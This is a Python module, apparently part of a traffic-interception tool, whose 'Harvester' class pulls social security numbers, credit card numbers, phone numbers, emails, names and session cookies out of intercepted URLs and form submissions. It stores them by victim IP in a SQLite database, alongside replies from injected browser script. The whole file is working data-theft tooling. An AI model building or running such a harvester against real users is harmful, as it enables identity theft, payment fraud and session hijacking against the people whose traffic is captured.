#!/usr/bin/env python3

import sqlite3
import json
from urllib.parse import urlparse, parse_qs
import re

SSN_LABEL = "(?i)(ssn|social)"
SSN_REGEX = "^(?!666|000|9\\d{2})\\d{3}-(?!00)\\d{2}-(?!0{4})\\d{4}$"
PHONE_LABEL = "(?i)phone"
PHONE_REGEX = "^(\+\d{1,2}\s)?\(?\d{3}\)?[\s.-]\d{3}[\s.-]\d{4}$"
EMAIL_LABEL = "(?i)email"
EMAIL_REGEX = "^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$"
CC_LABEL = "(?i)(credit|card)"
CC_REGEX ='''^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|  3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$'''
NAME_LABEL = "(?i)name$"

class Heuristics:

    def __init__(self):
        try:
            with open('names.list') as f:
                 self.names = [line.rstrip().lower() for line in f]
        except:
            print("failed to read names file")
            self.names  = []

    def is_ssn(self, value, param) -> bool:
        return re.search(SSN_REGEX, value) is not None and re.search(SSN_LABEL, param) is not None


    def is_cc(self, value, param) -> bool:
        return re.search(CC_REGEX, value)is not None or re.search(CC_LABEL, param) is not None


    def is_phone_number(self, value, param) -> bool:
            return re.search(PHONE_REGEX, value)is not None or re.search(PHONE_LABEL, param) is not None

    def is_email(self, value, param) -> bool:
        return re.search(EMAIL_REGEX, value) is not None or re.search(EMAIL_LABEL, param) is not None


    def is_name(self, value, param) -> bool:
        return value.lower() in self.names or re.search(NAME_LABEL, param) is not None

    def fields(self):
        return {
            "social security number": self.is_ssn,
            "credit card number": self.is_cc,
            "phone number": self.is_phone_number,
            "email": self.is_email,
            "name": self.is_name
        }

class Harvester:

    def __init__(self, server_mode, server_ip="undefined", database=None):
        self.session = None
        self.server_ip = server_ip
        self.server_mode = server_mode;

        self.heuristics = Heuristics()

        try:
            self.conn = sqlite3.connect(database)
            self.db = database
        except:
            print(f"failed to connect to database({database}) fallback to memory")
            self.conn = sqlite3.connect(":memory:")
            self.db = ":memory:"

        self.conn.commit()

        self.__create_table()


    def __create_table(self):

        self.conn.execute('''CREATE TABLE IF NOT EXISTS INJECTS
                    (IP           TEXT    NOT NULL,
                    AGENT          TEXT    NOT NULL,
                    SCREEN         TEXT    NOT NULL,
                    LANG           TEXT    NOT NULL,
                    SESSION       INT     NOT NULL);''')

        self.conn.execute('''CREATE TABLE IF NOT EXISTS HARVEST
                    (IP           TEXT    NOT NULL,
                    TYPE          TEXT    NOT NULL,
                    VALUE         TEXT    NOT NULL,
                    URL           TEXT    NOT NULL,
                    MODE          TEXT    NOT NULL,
                    SESSION       INT     NOT NULL);''')
        self.conn.commit()
        self.conn.execute('''CREATE TABLE IF NOT EXISTS SESSIONS
                    (SESSION      INTEGER PRIMARY KEY AUTOINCREMENT,
                     IP           TEXT,
                     MODE         TEXT);''')
        self.conn.execute('''INSERT INTO SESSIONS (IP,MODE)
                    VALUES (?, ?)''',(self.server_ip, self.server_mode))
        self.conn.commit()

        cur = self.conn.execute('''SELECT SESSION FROM SESSIONS
                                   ORDER BY SESSION DESC LIMIT 1;''')
        self.session_id = cur.fetchone()[0]

    def __add(self, ip, type, value, url):
        conn = sqlite3.connect(self.db)
        conn.execute('''INSERT INTO HARVEST (IP, TYPE, VALUE, URL, MODE, SESSION)
                        VALUES (?, ?, ?, ?, ?, ?)''',(ip, type, value, url,
                        self.server_mode, self.session_id))
        conn.commit()
        conn.close()

    def add_inject_reply(self, ip, data):
        conn = sqlite3.connect(self.db)
        print("inj reply", data)
        conn.execute('''INSERT INTO INJECTS (IP, AGENT, SCREEN, LANG, SESSION)
                        VALUES (?, ?, ?, ?, ?)''',(str(ip),
                        str(data["user-agent"]), str(data["screen"]),
                        str(data["lang"]), self.session_id))
        conn.commit()
        conn.close()


    def __extract_data(self, data, url, ip):
        for param, value in data.items():
            for key, heuristics in self.heuristics.fields().items():
                if heuristics(value[0], param):
                    self.__add(ip, str(param), str(value[0]), url)


    def harvest_cookies(self, cookies, url, ip):
        self.__add(ip, "Cookie", str(cookies), url)


    def harvest_data(self, data, url, ip):
        if not data:
            return
        self.__extract_data(data, url, ip)


    def harvest_url(self, url, ip):
        data = parse_qs(urlparse(url).query)
        self.__extract_data(data, url, ip)

    def getSessionHarvests(self):
        conn = sqlite3.connect(self.db)
        cur = conn.execute('''SELECT * from HARVEST
                           WHERE SESSION = (?)''', (self.session_id,))
        rows = [str(row) for row in cur.fetchall()]
        conn.close();
        return rows;

    def getAllHarvests(self):
        conn = sqlite3.connect(self.db)
        cur = conn.execute('''SELECT * from HARVEST''')
        rows = [str(row) for row in cur.fetchall()]
        conn.close();
        return rows;

    def getAllInjectReply(self):
        conn = sqlite3.connect(self.db)
        cur = conn.execute('''SELECT * from INJECTS''')
        rows = [str(row) for row in cur.fetchall()]
        conn.close();
        return rows;

    def __str__(self):
        rows = self.getAllHarvests()
        return "\r\n".join(rows)

    def __del__(self):
        self.conn.close();

if __name__ == "__main__":
    harvest = Harvester("localhost", "passive",database="harvest.sqlite")
    print(harvest)
